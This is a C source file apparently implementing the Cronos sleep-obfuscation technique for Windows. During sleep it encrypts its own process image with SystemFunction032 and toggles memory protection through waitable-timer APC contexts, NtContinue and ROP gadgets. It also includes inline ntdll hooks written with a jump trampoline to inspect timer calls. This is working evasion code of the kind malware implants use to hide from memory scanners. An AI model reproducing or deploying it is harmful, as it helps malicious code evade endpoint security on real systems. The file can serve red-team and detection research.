#include "Cronos.h"
#include "Utils.h"
#include <stdint.h>

NTSTATUS hookNtCreateTimer(PHANDLE TimerHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, TIMER_TYPE TimerType) {
	printf("Hooked NtCreateTimer called!\n");
	switch (TimerType) {
		case NotificationTimer:
			printf("TimerType: NotificationTimer\n");
			break;
		case SynchronizationTimer:
			printf("TimerType: SynchronizationTimer\n");
			break;
	}

	if (ObjectAttributes->SecurityDescriptor == NULL) {
		printf("SecurityDescriptor is NULL!\n");
	}
	else {
		printf("SecurityDescriptor is NOT NULL!\n");
	}

	if (ObjectAttributes->SecurityQualityOfService == NULL) {
		printf("SecurityQualityOfService is NULL!\n");
	}
	else {
		printf("SecurityQualityOfService is NOT NULL!\n");
	}

	if (ObjectAttributes->RootDirectory == NULL) {
		printf("RootDirectory is NULL!\n");
	}
	else {
		printf("RootDirectory is NOT NULL! Value: %p\n", ObjectAttributes->RootDirectory);
	}

	printf("DesiredAccess: 0x%x\nObjectAttributes->ObjectName->Buffer: %ls\nObjectAttributes->Attributes: 0x%x\n\n", DesiredAccess, ObjectAttributes->ObjectName->Buffer, ObjectAttributes->Attributes);
	printf("Access mask testing:\nTIMER_QUERY_STATE: 0x%x\nTIMER_MODIFY_STATE: 0x%x\nTIMER_ALL_ACCESS: 0x%x\n", TIMER_QUERY_STATE, TIMER_MODIFY_STATE, TIMER_ALL_ACCESS);
	return STATUS_SUCCESS;
}

NTSTATUS hookNtSetTimerEx(HANDLE TimerHandle, TIMER_SET_INFORMATION_CLASS TimerSetInformationClass, PVOID TimerSetInformation, ULONG TimerSetInformationLength) {
	printf("Hooked NtSetTimerEx called!\n");
	switch (TimerSetInformationClass) {
	case TimerSetCoalescableTimer:
		printf("TimerSetInformationClass: TimerSetCoalescableTimer\n");
		TIMER_SET_COALESCABLE_TIMER_INFO * timerInfo = (TIMER_SET_COALESCABLE_TIMER_INFO*)TimerSetInformation;
		COUNTED_REASON_CONTEXT* wakeContext = (COUNTED_REASON_CONTEXT*)timerInfo->WakeContext;
		printf("TimerSetCoalescableTimerInfo->DueTime: %lld\n", (long long)timerInfo->DueTime.QuadPart);
		printf("TimerSetCoalescableTimerInfo->TimerApcRoutine: %p\n", timerInfo->TimerApcRoutine);
		printf("TimerSetCoalescableTimerInfo->TimerContext: %p\n", timerInfo->TimerContext);		
		printf("TimerSetCoalescableTimerInfo->Period: %lu\n", timerInfo->Period);
		printf("TimerSetCoalescableTimerInfo->TolerableDelay: %lu\n", timerInfo->TolerableDelay);
		if (wakeContext != NULL) {
			printf("TimerSetCoalescableTimerInfo->WakeContext->Flags: 0x%x\n", wakeContext->Flags);
		}
		else {
			printf("TimerSetCoalescableTimerInfo->WakeContext: NULL\n");
		}
		if (timerInfo->PreviousState != NULL) {
			printf("TimerSetCoalescableTimerInfo->PreviousState: %d\n", (int)*timerInfo->PreviousState);
		}
		else {
			printf("TimerSetCoalescableTimerInfo->PreviousState: NULL\n");
		}
		break;
	case MaxTimerInfoClass:
		printf("TimerSetInformationClass: MaxTimerInfoClass\n");
		break;
	default:
		printf("TimerSetInformationClass: Unknown\n");
		break;
	}
	printf("TimerSetInformationLength: %d\n", TimerSetInformationLength);
	return STATUS_SUCCESS;
}

NTSTATUS hookNtCreateTimer2(PHANDLE TimerHandle, PVOID Reserved1, POBJECT_ATTRIBUTES ObjectAttributes, ULONG Attributes, ACCESS_MASK DesiredAccess) {
	printf("Hooked NtCreateTimer2 called!\n");
	printf("Reserved1: %p\nObjectAttributes->ObjectName->Buffer: %ls\nAttributes: 0x%x\nDesiredAccess: 0x%x\n", Reserved1, ObjectAttributes->ObjectName->Buffer, Attributes, DesiredAccess);
	return STATUS_SUCCESS;
}

void HookFunc(PBYTE hookAddress, LPVOID jumpAddress) {
	uint8_t trampoline[] = {
		0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov r10, addr
		0x41, 0xFF, 0xE2                                            // jmp r10
	};

	DWORD oldProtect = 0;
	uint64_t addr = (uint64_t)(jumpAddress);
	memcpy(&trampoline[2], &addr, sizeof(addr));
	SIZE_T regionSize = sizeof(trampoline);

	if (!VirtualProtect(hookAddress, regionSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
		printf("Failed to change protection of hook address!\n");
		return;
	}
	if (!WriteProcessMemory(GetCurrentProcess(), hookAddress, (LPCVOID)trampoline, regionSize, NULL)) {
		printf("Failed to write trampoline to hook address!\n");
		return;
	}
	if (!VirtualProtect(hookAddress, regionSize, oldProtect, &oldProtect)) {
		printf("Failed to restore protection of hook address!\n");
		return;
	}
	printf("Hooked function at address: %p\n", hookAddress);
}

void CronosSleep(int sleepTime) {
	HANDLE hProtectionRWTimer;
	HANDLE hProtectionRWXTimer;
	HANDLE hEncryptionTimer;
	HANDLE hDecryptionTimer;
	HANDLE hDummyThreadTimer;

	LARGE_INTEGER protectionRWDueTime;
	LARGE_INTEGER protectionRWXDueTime;
	LARGE_INTEGER encryptionDueTime;
	LARGE_INTEGER decryptionDueTime;
	LARGE_INTEGER dummyDueTime;

	PVOID rcxGadget;
	PVOID rdxGadget;
	PVOID shadowFixerGadget;

	CONTEXT ctxDummyThread = { 0 };
	CONTEXT ctxProtectionRW = { 0 };
	CONTEXT ctxProtectionRWX = { 0 };
	CONTEXT ctxEncryption = { 0 };
	CONTEXT ctxDecryption = { 0 };

	PVOID NtContinue = NULL;
	tSystemFunction032 SystemFunction032 = NULL;

	PVOID ImageBase = NULL;
	DWORD ImageSize = 0;
	DWORD oldProtect = 0;
	CRYPT_BUFFER Image = { 0 };
	DATA_KEY Key = { 0 };
	CHAR keyBuffer[16] = { 0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18 };

	// Load systemfunction032.
	HMODULE hAdvapi32 = LoadLibraryA("Advapi32.dll");
	HMODULE hNtdll = GetModuleHandleA("Ntdll.dll");

	if (hAdvapi32 == 0 || hNtdll == 0)
		return;

	SystemFunction032 = (tSystemFunction032)GetProcAddress(hAdvapi32, "SystemFunction032");
	NtContinue = GetProcAddress(hNtdll, "NtContinue");

	// Getting the image base.
	ImageBase = GetModuleHandleA(NULL);
	printf("Base address: %p\n", ImageBase);
	ImageSize = ((PIMAGE_NT_HEADERS)((DWORD_PTR)ImageBase + ((PIMAGE_DOS_HEADER)ImageBase)->e_lfanew))->OptionalHeader.SizeOfImage;

	// Initializing the image and key for SystemFunction032.
	Key.Buffer = keyBuffer;
	Key.Length = Key.MaximumLength = 16;

	Image.Buffer = ImageBase;
	Image.Length = Image.MaximumLength = ImageSize;

	// Creating the waitable timers.
	hProtectionRWTimer = CreateWaitableTimerW(NULL, TRUE, L"ProtectionRWTimer");
	hProtectionRWXTimer = CreateWaitableTimerW(NULL, TRUE, L"ProtectionRWXTimer");
	hEncryptionTimer = CreateWaitableTimerW(NULL, TRUE, L"EncryptionTimer");
	hDecryptionTimer = CreateWaitableTimerW(NULL, TRUE, L"DecryptionTimer");
	hDummyThreadTimer = CreateWaitableTimerW(NULL, TRUE, L"DummyTimer");

	if (hProtectionRWTimer == 0 || hProtectionRWXTimer == 0 ||
		hEncryptionTimer == 0 || hDecryptionTimer == 0 || hDummyThreadTimer == 0) {

		printf("[ - ] Failed to create waitable timers: %d", GetLastError());
		FreeLibrary(hAdvapi32);
		return;
	}

	InitializeTimerMs(&dummyDueTime, 0);
	
	// Capture apc context.
	if (!SetWaitableTimer(hDummyThreadTimer, &dummyDueTime, 0, (PTIMERAPCROUTINE)RtlCaptureContext, &ctxDummyThread, FALSE)) {
		printf("[ - ] Failed to capture context: %d", GetLastError());
		goto CleanUp;
	}
	SleepEx(INFINITE, TRUE);

	LARGE_INTEGER liTimeout;
	liTimeout.QuadPart = -10000LL * INFINITE; // A negative value indicates a relative time	
	
	// Wait indefinitely in an alertable state
	/*NTSTATUS status = NtWaitForSingleObject(hDummyThreadTimer, TRUE, &liTimeout);
	if (status == STATUS_SUCCESS) {
		printf("Object signaled\n");
	}
	else if (status == STATUS_ALERTED) {
		printf("Alerted\n");
	} else if (status == STATUS_USER_APC) {
		printf("Wait succeeded rsp: %p\n", &ctxDummyThread.Rsp);
	} else {
		printf("Failed to wait for single object! Status: 0x%x\n", status);
		return 1;
	}*/
	
	// Creating the contexts.
	memcpy(&ctxProtectionRW, &ctxDummyThread, sizeof(CONTEXT));
	memcpy(&ctxEncryption, &ctxDummyThread, sizeof(CONTEXT));
	memcpy(&ctxDecryption, &ctxDummyThread, sizeof(CONTEXT));
	memcpy(&ctxProtectionRWX, &ctxDummyThread, sizeof(CONTEXT));	

	// VirtualProtect( ImageBase, ImageSize, PAGE_READWRITE, &OldProtect );	
	ctxProtectionRW.Rsp -= (8 + 0x150);
	ctxProtectionRW.Rip = (DWORD_PTR)VirtualProtect;
	ctxProtectionRW.Rcx = (DWORD_PTR)ImageBase;
	ctxProtectionRW.Rdx = ImageSize;
	ctxProtectionRW.R8 = PAGE_READWRITE;
	ctxProtectionRW.R9 = (DWORD_PTR)&oldProtect;
	printf("ctxProtectionRW.Rsp: %p\n", &ctxProtectionRW.Rsp);

	ctxEncryption.Rsp -= (8 + 0xF0);
	ctxEncryption.Rip = (DWORD_PTR)SystemFunction032;
	ctxEncryption.Rcx = (DWORD_PTR)&Image;
	ctxEncryption.Rdx = (DWORD_PTR)&Key;

	ctxDecryption.Rsp -= (8 + 0x90);
	ctxDecryption.Rip = (DWORD_PTR)SystemFunction032;
	ctxDecryption.Rcx = (DWORD_PTR)&Image;
	ctxDecryption.Rdx = (DWORD_PTR)&Key;

	ctxProtectionRWX.Rsp -= (8 + 0x30);
	ctxProtectionRWX.Rip = (DWORD_PTR)VirtualProtect;
	ctxProtectionRWX.Rcx = (DWORD_PTR)ImageBase;
	ctxProtectionRWX.Rdx = ImageSize;
	ctxProtectionRWX.R8 = PAGE_EXECUTE_READWRITE;
	ctxProtectionRWX.R9 = (DWORD_PTR)&oldProtect;

	InitializeTimerMs(&protectionRWDueTime, 0);
	InitializeTimerMs(&encryptionDueTime, 1);
	InitializeTimerMs(&decryptionDueTime, sleepTime - 1);
	InitializeTimerMs(&protectionRWXDueTime, sleepTime);

	// Getting the gadgets for the sleepex rop.

	// Gadget: pop rcx; ret;
	// This gadget pops the top value of the stack into the rcx register and then returns.
	// 'pop rcx' is represented by the opcode 0x59, and 'ret' is represented by 0xC3.
	rcxGadget = findGadget((PBYTE)"\x59\xC3", "xx");

	// Gadget: pop rdx; ret;
	// This gadget pops the top value of the stack into the rdx register and then returns.
	// 'pop rdx' is represented by the opcode 0x5A, and 'ret' is represented by 0xC3.
	rdxGadget = findGadget((PBYTE)"\x5A\xC3", "xx");

	// Gadget: add rsp, 20h; pop rdi; ret;
	// This gadget increases the stack pointer by 32 (0x20) bytes (adjusting the stack),
	// pops the next value into rdi, and then returns.
	// 'add rsp, 20h' is represented by the opcodes 0x48 0x83 0xC4 0x20,
	// 'pop rdi' is represented by 0x5F, and 'ret' by 0xC3.
	shadowFixerGadget = findGadget((PBYTE)"\x48\x83\xC4\x20\x5F\xC3", "xxxxxx");

	if (rcxGadget == 0 || rdxGadget == 0 || shadowFixerGadget == 0) {
		printf("[!] Error finding gadget\n");
		goto CleanUp;
	}

	// Setting the timers.
	if (!SetWaitableTimer(hDecryptionTimer, &decryptionDueTime, 0, NtContinue, &ctxDecryption, FALSE) ||
		!SetWaitableTimer(hProtectionRWXTimer, &protectionRWXDueTime, 0, NtContinue, &ctxProtectionRWX, FALSE) ||
		!SetWaitableTimer(hProtectionRWTimer, &protectionRWDueTime, 0, NtContinue, &ctxProtectionRW, FALSE) ||
		!SetWaitableTimer(hEncryptionTimer, &encryptionDueTime, 0, NtContinue, &ctxEncryption, FALSE))
	{
		printf("[ - ] Failed to SetWaitableTimer: %d", GetLastError());
		goto CleanUp;
	}

	printf("Original RSP: %p\n", &ctxDummyThread.Rsp);
	printf("ctxProtectionRW.Rsp: %p\n", &ctxProtectionRW.Rsp);

	// Executing the code.
	QuadSleep(rcxGadget, rdxGadget, shadowFixerGadget, (PVOID)SleepEx);

CleanUp:
	CloseHandle(hDummyThreadTimer);
	CloseHandle(hDecryptionTimer);
	CloseHandle(hProtectionRWXTimer);
	CloseHandle(hProtectionRWTimer);
	CloseHandle(hEncryptionTimer);
	FreeLibrary(hAdvapi32);
}

int main() {
	int sleepTime = 60;
	//HookFunc((PBYTE)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateTimer"), (void*)&hookNtCreateTimer);
	//HookFunc((PBYTE)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateTimer2"), (void*)&hookNtCreateTimer2);
	//HookFunc((PBYTE)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetTimerEx"), (void*)&hookNtSetTimerEx);
	//TestPentaNtWaitAndDelay(sleepTime);
	//printf("PentaNtWaitAndDelay test done!\n");
	//TestPentaNtWaitAndDelay2(sleepTime);
	//printf("PentaNtWaitAndDelay2 test done!\n");
	//TestPentaNtWaitAndDelay3(sleepTime);
	//printf("PentaNtWaitAndDelay3 test done!\n");
	//TestSeptaNtWaitAndDelay(sleepTime);
	//printf("SeptaNtWaitAndDelay test done!\n");
	//TestSeptaNtWaitAndDelay2(sleepTime);
	//printf("SeptaNtWaitAndDelay2 test done!\n");
	TestSeptaNtWaitAndDelay3(sleepTime);
	printf("SeptaNtWaitAndDelay3 test done!\n");
	//TestPentaWaitExAndDelay(sleepTime);
	//printf("PentaWaitExAndDelay test done!\n");
	//TestPentaWaitExAndDelay2(sleepTime);
	//printf("PentaWaitExAndDelay2 test done!\n");
	//TestQuadSleep();
	//printf("QuadSleep test done!\n");
	getchar();	
	printf("Sleeping for %d seconds...\n", sleepTime);	
	CronosSleep(sleepTime);
	printf("Done!\n");
	return 0;
}